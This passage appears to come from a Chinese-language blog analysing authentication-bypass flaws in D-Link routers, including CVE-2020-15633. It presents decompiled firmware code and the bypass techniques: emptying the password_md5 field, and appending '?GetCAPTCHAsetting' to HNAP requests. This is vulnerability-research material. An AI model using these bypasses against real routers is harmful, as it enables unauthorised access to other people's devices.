class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br></pre></td><td class="code"><pre><span class="line">undefined4 <span class="title function_">FUN_00012bb8</span><span class="params">(<span class="type">int</span> param_1)</span></span><br><span class="line"></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">int</span> iVar1;</span><br><span class="line">  uint __seed;</span><br><span class="line">  <span class="type">int</span> iVar2;</span><br><span class="line">  <span class="type">size_t</span> sVar3;</span><br><span class="line">  uint uVar4;</span><br><span class="line">  byte *pbVar5;</span><br><span class="line">  byte *pbVar6;</span><br><span class="line">  <span class="type">char</span> *__s1;</span><br><span class="line">  <span class="type">long</span> local_29c;</span><br><span class="line">  undefined4 local_25c;</span><br><span class="line">  undefined4 local_258;</span><br><span class="line">  undefined4 local_254;</span><br><span class="line">  undefined4 local_250;</span><br><span class="line">  undefined4 local_24c;</span><br><span class="line">  undefined4 local_248;</span><br><span class="line">  undefined4 local_244;</span><br><span class="line">  undefined4 local_240;</span><br><span class="line">  undefined4 local_23c;</span><br><span class="line">  undefined4 local_238;</span><br><span class="line">  undefined4 local_234;</span><br><span class="line">  undefined4 local_230;</span><br><span class="line">  undefined4 local_22c;</span><br><span class="line">  undefined4 local_228;</span><br><span class="line">  undefined2 uStack548;</span><br><span class="line">  undefined local_222;</span><br><span class="line">  <span class="type">char</span> acStack544 [<span class="number">88</span>];</span><br><span class="line">  undefined auStack456 [<span class="number">68</span>];</span><br><span class="line">  undefined4 local_184;</span><br><span class="line">  undefined4 local_180;</span><br><span class="line">  undefined4 local_17c;</span><br><span class="line">  undefined4 local_178;</span><br><span class="line">  undefined4 local_174;</span><br><span class="line">  undefined4 local_170;</span><br><span class="line">  undefined4 local_16c;</span><br><span class="line">  undefined4 local_168;</span><br><span class="line">  undefined local_164;</span><br><span class="line">  <span class="type">char</span> acStack352 [<span class="number">128</span>];</span><br><span class="line">  <span class="type">char</span> acStack224 [<span class="number">128</span>];</span><br><span class="line">  undefined4 local_60;</span><br><span class="line">  undefined4 local_5c;</span><br><span class="line">  undefined4 local_58;</span><br><span class="line">  undefined4 local_54;</span><br><span class="line">  undefined4 local_50;</span><br><span class="line">  undefined local_4c;</span><br><span class="line">  undefined4 local_48;</span><br><span class="line">  undefined4 local_44;</span><br><span class="line">  undefined4 local_40;</span><br><span class="line">  undefined4 local_3c;</span><br><span class="line">  undefined4 local_38;</span><br><span class="line">  undefined4 local_34;</span><br><span class="line">  undefined4 local_30;</span><br><span class="line">  undefined4 local_2c;</span><br><span class="line">  undefined4 local_28;</span><br><span class="line">  uint local_24;</span><br><span class="line">  </span><br><span class="line">  local_48 = <span class="number">0</span>;</span><br><span class="line">  local_44 = <span class="number">0</span>;</span><br><span class="line">  local_40 = <span class="number">0</span>;</span><br><span class="line">  local_3c = <span class="number">0</span>;</span><br><span class="line">  local_38 = <span class="number">0</span>;</span><br><span class="line">  local_34 = <span class="number">0</span>;</span><br><span class="line">  local_30 = <span class="number">0</span>;</span><br><span class="line">  local_2c = <span class="number">0</span>;</span><br><span class="line">  local_28 = <span class="number">0</span>;</span><br><span class="line">  local_24 = <span class="number">0</span>;</span><br><span class="line">  local_60 = <span class="number">0</span>;</span><br><span class="line">  local_5c = <span class="number">0</span>;</span><br><span class="line">  local_58 = <span class="number">0</span>;</span><br><span class="line">  local_54 = <span class="number">0</span>;</span><br><span class="line">  local_50 = <span class="number">0</span>;</span><br><span class="line">  local_4c = <span class="number">0</span>;</span><br><span class="line">  <span class="built_in">memset</span>(acStack224,<span class="number">0</span>,<span class="number">0x80</span>);</span><br><span class="line">  <span class="built_in">memset</span>(acStack352,<span class="number">0</span>,<span class="number">0x80</span>);</span><br><span class="line">  local_184 = <span class="number">0</span>;</span><br><span class="line">  local_180 = <span class="number">0</span>;</span><br><span class="line">  local_17c = <span class="number">0</span>;</span><br><span class="line">  local_178 = <span class="number">0</span>;</span><br><span class="line">  local_174 = <span class="number">0</span>;</span><br><span class="line">  local_170 = <span class="number">0</span>;</span><br><span class="line">  local_16c = <span class="number">0</span>;</span><br><span class="line">  local_168 = <span class="number">0</span>;</span><br><span class="line">  local_164 = <span class="number">0</span>;</span><br><span class="line">  <span class="built_in">memset</span>(auStack456,<span class="number">0</span>,<span class="number">0x41</span>);</span><br><span class="line">  <span class="built_in">memset</span>(acStack544,<span class="number">0</span>,<span class="number">0x56</span>);</span><br><span class="line">  local_22c = <span class="number">0</span>;</span><br><span class="line">  local_228 = <span class="number">0</span>;</span><br><span class="line">  uStack548 = <span class="number">0</span>;</span><br><span class="line">  local_222 = <span class="number">0</span>;</span><br><span class="line">  local_23c = <span class="number">0</span>;</span><br><span class="line">  local_238 = <span class="number">0</span>;</span><br><span class="line">  local_234 = <span class="number">0</span>;</span><br><span class="line">  local_230 = <span class="number">0</span>;</span><br><span class="line">  local_25c = <span class="number">0</span>;</span><br><span class="line">  local_258 = <span class="number">0</span>;</span><br><span class="line">  local_254 = <span class="number">0</span>;</span><br><span class="line">  local_250 = <span class="number">0</span>;</span><br><span class="line">  local_24c = <span class="number">0</span>;</span><br><span class="line">  local_248 = <span class="number">0</span>;</span><br><span class="line">  local_244 = <span class="number">0</span>;</span><br><span class="line">  local_240 = <span class="number">0</span>;</span><br><span class="line">  FUN_0001f460(&amp;local_25c,<span class="number">0x20</span>,<span class="string">&quot;%s/sessiontimeout&quot;</span>,<span class="string">&quot;/var/proc/web/&quot;</span>);</span><br><span class="line">  sysinfo((sysinfo *)&amp;local_29c);</span><br><span class="line">  iVar1 = FUN_0001f7b8(param_1,*(undefined4 *)(param_1 + <span class="number">0xbcc</span>));</span><br><span class="line">  <span class="keyword">if</span> (iVar1 != <span class="number">1</span>) &#123;</span><br><span class="line">    __s1 = (<span class="type">char</span> *)(param_1 + <span class="number">0x13f8</span>);</span><br><span class="line">    local_22c = <span class="number">0</span>;</span><br><span class="line">    local_228 = <span class="number">0</span>;</span><br><span class="line">    uStack548 = <span class="number">0</span>;</span><br><span class="line">    local_222 = <span class="number">0</span>;</span><br><span class="line">    FUN_0001f460(&amp;local_22c,<span class="number">10</span>,<span class="string">&quot;%s/hmac_md5/%s/session_uid&quot;</span>,<span class="string">&quot;/var/proc/web/&quot;</span>,__s1);</span><br><span class="line">    iVar1 = <span class="built_in">strcmp</span>(__s1,(<span class="type">char</span> *)&amp;local_22c);</span><br><span class="line">    <span class="keyword">if</span> (iVar1 == <span class="number">0</span>) &#123;</span><br><span class="line">      <span class="built_in">snprintf</span>((<span class="type">char</span> *)&amp;local_25c,<span class="number">0x1f</span>,<span class="string">&quot;%d&quot;</span>,local_29c);</span><br><span class="line">      FUN_0001f4f4(&amp;local_25c,<span class="number">0x20</span>,<span class="string">&quot;%s/hmac_md5/%s/time&quot;</span>,<span class="string">&quot;/var/proc/web/&quot;</span>,__s1);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span> &#123;</span><br><span class="line">      __seed = time((<span class="type">time_t</span> *)<span class="number">0x0</span>);</span><br><span class="line">      srand(__seed);</span><br><span class="line">      iVar1 = <span class="number">0</span>;</span><br><span class="line">      <span class="keyword">do</span> &#123;</span><br><span class="line">        iVar2 = rand();</span><br><span class="line">        __seed = iVar2 % <span class="number">0x3e</span>;</span><br><span class="line">        <span class="keyword">if</span> (__seed &lt; <span class="number">10</span>) &#123;</span><br><span class="line">          *(<span class="type">char</span> *)((<span class="type">int</span>)&amp;local_48 + iVar1) = (<span class="type">char</span>)__seed + <span class="string">&#x27;0&#x27;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span> &#123;</span><br><span class="line">          uVar4 = __seed - <span class="number">10</span>;</span><br><span class="line">          <span class="keyword">if</span> (uVar4 &lt; <span class="number">0x1a</span>) &#123;</span><br><span class="line">            __seed = __seed + <span class="number">0x37</span>;</span><br><span class="line">          &#125;</span><br><span class="line">          <span class="keyword">if</span> (uVar4 &lt; <span class="number">0x1a</span>) &#123;</span><br><span class="line">            *(<span class="type">char</span> *)((<span class="type">int</span>)&amp;local_48 + iVar1) = (<span class="type">char</span>)__seed;</span><br><span class="line">          &#125;</span><br><span class="line">          <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="keyword">if</span> (__seed - <span class="number">0x24</span> &lt; <span class="number">0x1a</span>) &#123;</span><br><span class="line">              *(<span class="type">char</span> *)((<span class="type">int</span>)&amp;local_48 + iVar1) = (<span class="type">char</span>)__seed + <span class="string">&#x27;=&#x27;</span>;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">else</span> &#123;</span><br><span class="line">              *(undefined *)((<span class="type">int</span>)&amp;local_48 + iVar1) = <span class="number">0x30</span>;</span><br><span class="line">            &#125;</span><br><span class="line">          &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        iVar1 = iVar1 + <span class="number">1</span>;</span><br><span class="line">      &#125; <span class="keyword">while</span> (iVar1 != <span class="number">0x28</span>);</span><br><span class="line">      iVar1 = <span class="number">0</span>;</span><br><span class="line">      local_24 = local_24 &amp; <span class="number">0xffffff</span>;</span><br><span class="line">      <span class="built_in">strncpy</span>((<span class="type">char</span> *)&amp;local_60,(<span class="type">char</span> *)&amp;local_48,<span class="number">0x14</span>);</span><br><span class="line">      <span class="built_in">strncpy</span>(acStack224,(<span class="type">char</span> *)&amp;local_34,<span class="number">0x14</span>);</span><br><span class="line">      FUN_0001f4f4(&amp;local_60,<span class="number">0x14</span>,<span class="string">&quot;%s/hmac_md5/%s/challenge&quot;</span>,<span class="string">&quot;/var/proc/web/&quot;</span>,__s1);</span><br><span class="line">      FUN_0001f4f4(acStack224,<span class="number">0x14</span>,<span class="string">&quot;%s/hmac_md5/%s/public_key&quot;</span>,<span class="string">&quot;/var/proc/web/&quot;</span>,__s1);</span><br><span class="line">      FUN_0001f4f4(__s1,<span class="number">10</span>,<span class="string">&quot;%s/hmac_md5/%s/session_uid&quot;</span>,<span class="string">&quot;/var/proc/web/&quot;</span>,__s1);</span><br><span class="line">      FUN_00021320(auStack456,<span class="number">0x41</span>,<span class="string">&quot;/sys/user:%d/%s&quot;</span>,<span class="number">1</span>,<span class="string">&quot;password&quot;</span>);</span><br><span class="line">      <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>,<span class="string">&quot;password  = %s\n&quot;</span>,auStack456);</span><br><span class="line">      <span class="built_in">snprintf</span>(acStack544,<span class="number">0x56</span>,<span class="string">&quot;%s%s&quot;</span>,acStack224,auStack456);</span><br><span class="line">      <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>,<span class="string">&quot;public_key_add_pass = %s\n&quot;</span>,acStack544);</span><br><span class="line">      local_23c = <span class="number">0</span>;</span><br><span class="line">      local_238 = <span class="number">0</span>;</span><br><span class="line">      local_234 = <span class="number">0</span>;</span><br><span class="line">      local_230 = <span class="number">0</span>;</span><br><span class="line">      sVar3 = <span class="built_in">strlen</span>(acStack544);</span><br><span class="line">      FUN_0001fd40(&amp;local_60,<span class="number">0x14</span>,acStack544,sVar3,&amp;local_23c);</span><br><span class="line">      pbVar5 = (byte *)((<span class="type">int</span>)&amp;local_240 + <span class="number">3</span>);</span><br><span class="line">      pbVar6 = pbVar5;</span><br><span class="line">      <span class="keyword">do</span> &#123;</span><br><span class="line">        pbVar6 = pbVar6 + <span class="number">1</span>;</span><br><span class="line">        iVar2 = <span class="built_in">sprintf</span>((<span class="type">char</span> *)((<span class="type">int</span>)&amp;local_184 + iVar1),<span class="string">&quot;%02x&quot;</span>,(uint)*pbVar6);</span><br><span class="line">        iVar1 = iVar1 + iVar2;</span><br><span class="line">      &#125; <span class="keyword">while</span> (pbVar6 != (byte *)((<span class="type">int</span>)&amp;local_230 + <span class="number">3</span>));</span><br><span class="line">      <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>,<span class="string">&quot;private_key is = %s\n&quot;</span>,&amp;local_184);</span><br><span class="line">      FUN_0001f4f4(&amp;local_184,<span class="number">0x20</span>,<span class="string">&quot;%s/hmac_md5/%s/private_key&quot;</span>,<span class="string">&quot;/var/proc/web/&quot;</span>,__s1);</span><br><span class="line">      iVar1 = <span class="number">0</span>;</span><br><span class="line">      local_23c = <span class="number">0</span>;</span><br><span class="line">      local_238 = <span class="number">0</span>;</span><br><span class="line">      local_234 = <span class="number">0</span>;</span><br><span class="line">      local_230 = <span class="number">0</span>;</span><br><span class="line">      FUN_0001fd40(&amp;local_60,<span class="number">0x14</span>,&amp;local_184,<span class="number">0x20</span>,&amp;local_23c);</span><br><span class="line">      <span class="keyword">do</span> &#123;</span><br><span class="line">        pbVar5 = pbVar5 + <span class="number">1</span>;</span><br><span class="line">        iVar2 = <span class="built_in">sprintf</span>(acStack352 + iVar1,<span class="string">&quot;%02x&quot;</span>,(uint)*pbVar5);</span><br><span class="line">        iVar1 = iVar1 + iVar2;</span><br><span class="line">      &#125; <span class="keyword">while</span> (pbVar5 != (byte *)((<span class="type">int</span>)&amp;local_230 + <span class="number">3</span>));</span><br><span class="line">      <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>,<span class="string">&quot;password_md5 = %s\n&quot;</span>,acStack352);</span><br><span class="line">      FUN_0001f4f4(acStack352,<span class="number">0x20</span>,<span class="string">&quot;%s/hmac_md5/%s/password_md5&quot;</span>,<span class="string">&quot;/var/proc/web/&quot;</span>,__s1);</span><br><span class="line">      <span class="built_in">snprintf</span>((<span class="type">char</span> *)&amp;local_25c,<span class="number">0x1f</span>,<span class="string">&quot;%d&quot;</span>,local_29c);</span><br><span class="line">      FUN_0001f4f4(&amp;local_25c,<span class="number">0x20</span>,<span class="string">&quot;%s/hmac_md5/%s/time&quot;</span>,<span class="string">&quot;/var/proc/web/&quot;</span>,__s1);</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div><p>通过交叉引用发现调用此函数的位置是处理 http 请求的主函数，内容较多这里就不贴代码了，大概逻辑就是匹配 http 请求的各个字段然后采取不同的操作，从上面的代码中我们可以发现 password_md5 文件内容似乎是从用户请求中取得的，我猜测是用户点击登录按钮之后会通过 php 代码计算出某些必要的数据，然后传递给 httpd 解析并保存到对应的文件中，之后在 __login.php 中进行验证，这样来看，一旦用户手动清空 password_md5 对应字段的内容，那么将导致 $password_d 变量为空，验证密码的逻辑就变成了</p><div class="code-container" data-rel="Php"><figure class="iseeu highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$LOGIN_PASSWD</span>=<span class="string">&quot;&quot;</span>;</span><br><span class="line"><span class="variable">$password_d</span>=<span class="string">&quot;&quot;</span>;</span><br><span class="line"><span class="keyword">if</span>(<span class="variable">$LOGIN_PASSWD</span> == <span class="variable">$password_d</span>)</span><br><span class="line">&#123;</span><br><span class="line">	<span class="keyword">echo</span> <span class="string">&quot;Success!&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">&#123;</span><br><span class="line">	<span class="keyword">echo</span> <span class="string">&quot;Fail!&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure></div><p>这样就可以绕过正常的登录验证，顺利进入后台。</p><p>官方的修复手段就是先判断 $password_d 是否为空，然后才进行比较。</p><h1 id="CVE-2020-15633"><a href="#CVE-2020-15633" class="headerlink" title="CVE-2020-15633"></a>CVE-2020-15633</h1><p>2020 年 7 月 20 日，ZDI 披露了 Dlink DIR 系列路由器的一个身份验证绕过漏洞，此漏洞影响多个不同的路由器设备，攻击者通过构造特殊的 HTTP 请求即可触发漏洞，绕过登录验证逻辑，直接访问敏感接口。</p><h2 id="漏洞基本信息-2"><a href="#漏洞基本信息-2" class="headerlink" title="漏洞基本信息"></a>漏洞基本信息</h2><p>以下是从披露页面摘抄的漏洞信息</p><div class="code-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">This vulnerability allows network-adjacent attackers to bypass authentication on affected installations of D-Link DIR-867, DIR-878, and DIR-882 routers. Authentication is not required to exploit this vulnerability.</span><br><span class="line"></span><br><span class="line">The specific flaw exists within the handling of HNAP requests. The issue results from incorrect string matching logic when accessing protected pages. An attacker can leverage this vulnerability to escalate privileges and execute code in the context of the router.</span><br></pre></td></tr></table></figure></div><p>此漏洞影响 DIR-867, DIR-878, DIR-882 路由器，漏洞产生原因大概是在处理 HNAP 请求过程中，验证用户登录的逻辑存在问题，导致攻击者可以构造特殊的 HTTP 请求绕过身份验证，从而访问敏感 API 接口。</p><p>漏洞类型：身份验证绕过</p><p>漏洞威胁：较高 (8.8)</p><p>漏洞影响：攻击者绕过身份验证，从而访问敏感 API，执行敏感操作。</p><h2 id="漏洞分析-3"><a href="#漏洞分析-3" class="headerlink" title="漏洞分析"></a>漏洞分析</h2><p>以 DIR-878 路由器为例，固件下载地址：<a class="link" href="ftp://ftp2.dlink.com/PRODUCTS/DIR-878/REVA/">ftp://ftp2.dlink.com/PRODUCTS/DIR-878/REVA/<i class="fa-solid fa-arrow-up-right ml-[0.2em] font-light align-text-top text-[0.7em] link-icon"></i></a></p><p>请下载 1.20B05 版本，此漏洞在最新版中已经修复。</p><p>DIR 878 路由器的固件经过加密，binwalk 无法直接解包，解包手段可以参考 <a href="https://wzt.ac.cn/2019/09/18/D-Link_BUG/">https://wzt.ac.cn/2019/09/18/D-Link_BUG/</a></p><p>解包之后找到关键文件 prog.cgi，此文件负责解析和处理 HTTP 请求。将它加载到 Ghidra 中即可开始分析。</p><p>根据披露信息，触发此漏洞的手段是在正常的 HNAP 请求后面添加 ‘?GetCAPTCHAsetting’，添加之后将数据包发送给路由器即可绕过身份验证从而访问任意的 API 接口。于是利用字符串搜索功能在目标文件中查找字符串 GetCAPTCHAsetting，得到几条交叉引用信息，其中位于 004d01a0 位置的字符串是我们重点关注的对象。</p><p>双击来到目标地址，发现如下信息：</p><div class="code-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br></pre></td><td class="code"><pre><span class="line">                             PTR_DAT_004d0194                                XREF[3]:     FUN_0041d81c:0041d928 (R) , </span><br><span class="line">                                                                                          FUN_0041d81c:0041da04 (R) , </span><br><span class="line">                                                                                          websWriteBlockWithTranslation:00</span><br><span class="line">        004d0194 e4  48  4b  00    addr       DAT_004b48e4                                     = 23h    #</span><br><span class="line">        004d0198 00              ??         00h</span><br><span class="line">        004d0199 00              ??         00h</span><br><span class="line">        004d019a 00              ??         00h</span><br><span class="line">        004d019b 00              ??         00h</span><br><span class="line">        004d019c 00              ??         00h</span><br><span class="line">        004d019d 00              ??         00h</span><br><span class="line">        004d019e 00              ??         00h</span><br><span class="line">        004d019f 00              ??         00h</span><br><span class="line">        004d01a0 47  65  74       ds         &quot;GetCAPTCHAsetting&quot;</span><br><span class="line">                 43  41  50 </span><br><span class="line">                 54  43  48 </span><br><span class="line">        004d01b4 00              ??         00h</span><br><span class="line">        004d01b5 00              ??         00h</span><br><span class="line">        004d01b6 00              ??         00h</span><br><span class="line">        004d01b7 00              ??         00h</span><br><span class="line">        004d01b8 00              ??         00h</span><br><span class="line">        004d01b9 00              ??         00h</span><br><span class="line">        004d01ba 00              ??         00h</span><br><span class="line">        004d01bb 00              ??         00h</span><br><span class="line">        004d01bc 00              ??         00h</span><br><span class="line">        004d01bd 00              ??         00h</span><br><span class="line">        004d01be 00              ??         00h</span><br><span class="line">        004d01bf 00              ??         00h</span><br><span class="line">        004d01c0 47  65  74       ds         &quot;GetDeviceSettings&quot;</span><br><span class="line">                 44  65  76 </span><br><span class="line">                 69  63  65 </span><br><span class="line">        004d01d4 00              ??         00h</span><br><span class="line">        004d01d5 00              ??         00h</span><br><span class="line">        004d01d6 00              ??         00h</span><br><span class="line">        004d01d7 00              ??         00h</span><br><span class="line">        004d01d8 00              ??         00h</span><br><span class="line">        004d01d9 00              ??         00h</span><br><span class="line">        004d01da 00              ??         00h</span><br><span class="line">        004d01db 00              ??         00h</span><br><span class="line">        004d01dc 00              ??         00h</span><br><span class="line">        004d01dd 00              ??         00h</span><br><span class="line">        004d01de 00              ??         00h</span><br><span class="line">        004d01df 00              ??         00h</span><br><span class="line">        004d01e0 62  6c  6f       ds         &quot;blockedPage.html&quot;</span><br><span class="line">                 63  6b  65 </span><br><span class="line">                 64  50  61 </span><br><span class="line">........</span><br></pre></td></tr></table></figure></div><p>类似于许多字符串的集合，并且两两之间偏移量都是 0x20。猜测此处是某种字符串列表，通过 PTR_DAT_004d0194 加上偏移量进行索引。</p><p>我们还可以使用 IDA 进行进一步的验证，将 prog.cgi 加载到 IDA 中，跳转到目标地址得到以下信息：</p><div class="code-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line">.data:004D01A0 aGetcaptchasett:.ascii &quot;GetCAPTCHAsetting&quot;&lt;0&gt;</span><br><span class="line">.data:004D01A0                                          # DATA XREF: sub_423ECC+D8↑o</span><br><span class="line">.data:004D01A0                                          # sub_423ECC+12C↑o ...</span><br><span class="line">.data:004D01B2                 .align 4</span><br><span class="line">.data:004D01C0 aGetdevicesetti_3:.ascii &quot;GetDeviceSettings&quot;&lt;0&gt;</span><br><span class="line">.data:004D01D2                 .align 4</span><br><span class="line">.data:004D01E0 aBlockedpageHtm:.ascii &quot;blockedPage.html&quot;&lt;0&gt;</span><br><span class="line">.data:004D01F1                 .align 4</span><br><span class="line">.data:004D0200 aMobileloginHtm:.ascii &quot;MobileLogin.html&quot;&lt;0&gt;</span><br><span class="line">.data:004D0211                 .align 4</span><br><span class="line">.data:004D0220 aLoginHtml:     .ascii &quot;Login.html&quot;&lt;0&gt;</span><br><span class="line">.data:004D022B                 .align 5</span><br><span class="line">.data:004D0240 aEulaHtml:      .ascii &quot;EULA.html&quot;&lt;0&gt;</span><br><span class="line">.data:004D024A                 .align 5</span><br><span class="line">.data:004D0260 aIndexHtml_2:   .ascii &quot;Index.html&quot;&lt;0&gt;</span><br><span class="line">.data:004D026B                 .align 5</span><br><span class="line">.data:004D0280 aWizardHtml:    .ascii &quot;Wizard.html&quot;&lt;0&gt;</span><br><span class="line">.data:004D028C                 .align 5</span><br><span class="line">.data:004D02A0 aHnap1_5:       .ascii &quot;/HNAP1/&quot;&lt;0&gt;</span><br><span class="line">.data:004D02A8                 .align 5</span><br><span class="line">.data:004D02C0 aEulaTermHtml:  .ascii &quot;EULA_Term.html&quot;&lt;0&gt;</span><br><span class="line">.data:004D02CF                 .align 5</span><br><span class="line">.data:004D02E0 aEulaPrivacyHtm:.ascii &quot;EULA_Privacy.html&quot;&lt;0&gt;</span><br><span class="line">.data:004D02F2                 .align 4</span><br></pre></td></tr></table></figure></div><p>IDA 对这部分数据识别的更加准确，正如我们的猜测，这里是一个字符串列表。</p><p>通过对列表首部地址的交叉引用，能找到使用这部分数据的代码，其中最关键的函数是 00423ecc，反编译结果如下：</p><div class="code-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br></pre></td><td class="code"><pre><span class="line">undefined4 <span class="title function_">allow_urls</span><span class="params">(<span class="type">int</span> param_1)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">int</span> iVar1;</span><br><span class="line">  <span class="type">char</span> *pcVar2;</span><br><span class="line">  uint uri_index;</span><br><span class="line">  <span class="type">char</span> acStack2092 [<span class="number">1024</span>];</span><br><span class="line">  <span class="type">char</span> acStack1068 [<span class="number">1024</span>];</span><br><span class="line">  undefined auStack44 [<span class="number">40</span>];</span><br><span class="line">  